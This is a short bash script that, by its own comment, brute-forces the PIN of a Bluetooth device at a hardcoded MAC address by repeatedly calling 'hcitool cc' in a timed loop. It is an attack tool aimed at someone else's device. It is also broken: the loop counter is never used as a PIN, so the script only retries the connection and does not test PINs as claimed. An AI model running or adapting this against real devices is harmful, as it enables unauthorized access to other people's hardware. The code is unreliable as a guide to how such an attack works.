#!/bin/bash

# Bruteforce the PIN for a bluetooth device

bt=00:07:80:4C:0F:2D
for i in `seq 0 3000`
do
    res=$(hcitool cc $bt 2>&1)
    if [ -z "$res" ]
    then
        echo FOUND
        exit
    fi
    echo $res
    sleep 3
done

